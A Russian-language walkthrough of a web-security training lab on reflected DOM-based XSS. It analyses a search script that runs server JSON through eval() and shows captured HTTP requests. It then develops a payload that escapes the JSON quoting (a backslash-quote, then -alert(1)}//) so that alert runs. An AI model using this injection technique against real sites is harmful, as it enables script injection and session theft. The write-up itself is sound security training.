Эта лабораторная работа демонстрирует уязвимость отраженного DOM. Уязвимости отраженного DOM возникают, когда приложение на стороне сервера обрабатывает данные из запроса и выводит их в ответ. Затем скрипт на странице обрабатывает отраженные данные небезопасным способом, в конечном итоге записывая их в опасный приемник.
## Дано

 - уязвимость отраженного DOM
 - приложение на стороне сервера обрабатывает данные из запроса и выводит их в ответ.
## Задача

 вызывать `alert()`функцию


# Разведка

- При поиске информации видим 
	`<script src="/resources/js/searchResults.js"></script>`
	`<script>search('search-results')</script>`

- `<script src="/resources/js/searchResults.js"></script>` - указывает на код который обрабатывает 
- `<script>search('search-results')</script>` - вызов функции search, передавая ей строку 'search-results' в качестве аргумента

![[Pasted image 20250129135208.png]]


- Скрипт по пути `/resources/js/searchResults.js` имеет 
```
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
```
1. **Объявление функции search:**
   - Функция принимает один аргумент path, который представляет собой путь к ресурсу, где будет выполняться поиск.

2. **Создание объекта XMLHttpRequest:**
   - `var xhr = new XMLHttpRequest();`
   - Здесь создается новый объект XMLHttpRequest, который позволяет выполнять асинхронные HTTP-запросы к серверу без перезагрузки страницы.

3. **Установка обработчика события onreadystatechange:**
   - `xhr.onreadystatechange = function() {...}`
   - Это свойство устанавливает функцию-обработчик, которая будет вызываться каждый раз, когда изменяется состояние объекта xhr.

4. **Проверка состояния запроса:**
   - `if (this.readyState == 4 && this.status == 200) {...}`
   - Здесь происходит проверка:
     - `this.readyState == 4` — означает, что запрос завершен.
     - `this.status == 200` — означает, что ответ от сервера успешный (HTTP статус 200).
   - Если оба условия истинны, это значит, что запрос выполнен успешно и можно обрабатывать ответ.

5. **Использование eval:**
   - `eval('var searchResultsObj = ' + this.responseText);`
   - Эта строка выполняет код, который создает переменную `searchResultsObj`, содержащую данные, полученные от сервера в формате JSON.

6. **Вызов функции для отображения результатов:**
   - `displaySearchResults(searchResultsObj);`
   - После успешного получения и парсинга данных вызывается функция displaySearchResults, которая, вероятно, отвечает за отображение результатов поиска на странице.

7. **Настройка и отправка запроса:**
   - `xhr.open("GET", path + window.location.search);`
   - Метод `open` настраивает запрос. Он устанавливает метод (в данном случае "GET") и URL (путь path, к которому добавляются параметры запроса из текущего URL через window.location.search).
   - `xhr.send();`
   - Метод send отправляет запрос на сервер.

# Атака

- Как из разведки видим ответ GET формируется при помощи пути и window.location.search
```
GET /search-results?search=home HTTP/2
Host: 0ace006604912a6480be58cb00ea009e.web-security-academy.net
Cookie: session=juwpxHmeqgZL2x5AMz55K01mxl9bniru
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0ace006604912a6480be58cb00ea009e.web-security-academy.net/?search=Interviews
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Te: trailers
```
Ответ
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 37

{"results":[],"searchTerm":"home123"}
```
- json формат ответа

Выходим за `"`
- `search=home123"-alert(1)` получает ответ `"searchTerm":"home123\"-alert(1)"` JSON экранирует
-  Экранируем кавычку сами `search=home123\"-alert(1)` ответ `"searchTerm":"home123\\"-alert(1)"}`
- Экранируем "}  `search=home123\"-alert(1)}//` ответ `"searchTerm":"home123\\"-alert(1)}//"}`

